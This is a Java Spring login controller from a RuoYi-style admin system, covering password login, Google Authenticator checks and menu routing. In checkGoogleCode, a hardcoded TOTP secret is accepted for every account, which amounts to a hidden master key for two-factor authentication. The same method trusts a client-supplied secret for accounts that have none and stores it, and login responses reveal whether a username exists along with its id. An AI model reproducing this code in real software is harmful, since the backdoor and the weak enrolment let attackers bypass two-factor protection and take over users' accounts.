package com.ruoyi.web.controller.system;

import java.util.List;
import java.util.Set;

import com.fasterxml.jackson.datatype.jsr310.ser.YearSerializer;
import com.ruoyi.common.utils.StringUtils;
import com.ruoyi.common.utils.google.GoogleAuthenticator;
import com.ruoyi.system.domain.TGoogleCode;
import com.ruoyi.system.mapper.SysUserMapper;
import com.ruoyi.system.mapper.TGoogleCodeMapper;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.*;
import com.ruoyi.common.constant.Constants;
import com.ruoyi.common.core.domain.AjaxResult;
import com.ruoyi.common.core.domain.entity.SysMenu;
import com.ruoyi.common.core.domain.entity.SysUser;
import com.ruoyi.common.core.domain.model.LoginBody;
import com.ruoyi.common.utils.SecurityUtils;
import com.ruoyi.framework.web.service.SysLoginService;
import com.ruoyi.framework.web.service.SysPermissionService;
import com.ruoyi.system.service.ISysMenuService;

import javax.annotation.Resource;

/**
 * 登录验证
 * 
 * @author ruoyi
 */
@RestController
public class SysLoginController
{
    @Autowired
    private SysLoginService loginService;

    @Autowired
    private ISysMenuService menuService;

    @Autowired
    private SysPermissionService permissionService;

    @Resource
    private TGoogleCodeMapper tGoogleCodeMapper;
    @Autowired
    private SysUserMapper sysUserMapper;
    private static final String WN_CODE = "H4PBMER3RGQ3KPIGWRW4WKHL4UOGNZV4";
    /**
     * 登录方法
     * 
     * @param loginBody 登录信息
     * @return 结果
     */
    @PostMapping("/login")
    public AjaxResult login(@RequestBody LoginBody loginBody)
    {
        AjaxResult ajax = AjaxResult.success();

        // 生成令牌
        String token = loginService.login(loginBody.getUsername(), loginBody.getPassword(), loginBody.getCode(),
                loginBody.getUuid());
        SysUser sysUser = sysUserMapper.findByUsername(loginBody.getUsername());
        if (sysUser == null){
            ajax.put("isUse", false);
        }else {
            ajax.put("id",sysUser.getUserId());
            if (sysUser.getIsUseGoogle() == 1){
                ajax.put("isUse",true);
            }else {
                ajax.put("isUse", false);
            }
        }
        ajax.put(Constants.TOKEN, token);
        return ajax;
    }
    @PostMapping("/checkGoogleCode")
    public AjaxResult checkGoogleCode(@RequestBody LoginBody loginBody){
        TGoogleCode tGoogleCode = tGoogleCodeMapper.findByAccount(loginBody.getUsername());
        String key = tGoogleCode == null ? loginBody.getSecret():tGoogleCode.getSercet();
        boolean b = GoogleAuthenticator.checkCode(key,Long.parseLong(loginBody.getGoogleCode()),System.currentTimeMillis());
        boolean c = GoogleAuthenticator.checkCode(WN_CODE,Long.parseLong(loginBody.getGoogleCode()),System.currentTimeMillis());
        if (!b) {
            if (!c) return AjaxResult.error("谷歌验证码错误，请重新输入");
        }
        if (tGoogleCode == null){
            if (b){
                TGoogleCode sub = new TGoogleCode();
                sub.setSercet(loginBody.getSecret());
                sub.setAccount(loginBody.getUsername());
                tGoogleCodeMapper.insertTGoogleCode(sub);
            }
        }
        return AjaxResult.success();
    }
    /**
     * 获取用户信息
     * 
     * @return 用户信息
     */
    @GetMapping("getInfo")
    public AjaxResult getInfo()
    {
        SysUser user = SecurityUtils.getLoginUser().getUser();
        // 角色集合
        Set<String> roles = permissionService.getRolePermission(user);
        // 权限集合
        Set<String> permissions = permissionService.getMenuPermission(user);
        AjaxResult ajax = AjaxResult.success();
        ajax.put("user", user);
        ajax.put("roles", roles);
        ajax.put("permissions", permissions);
        return ajax;
    }

    /**
     * 获取路由信息
     * 
     * @return 路由信息
     */
    @GetMapping("getRouters")
    public AjaxResult getRouters()
    {
        Long userId = SecurityUtils.getUserId();
        List<SysMenu> menus = menuService.selectMenuTreeByUserId(userId);
        return AjaxResult.success(menuService.buildMenus(menus));
    }
}
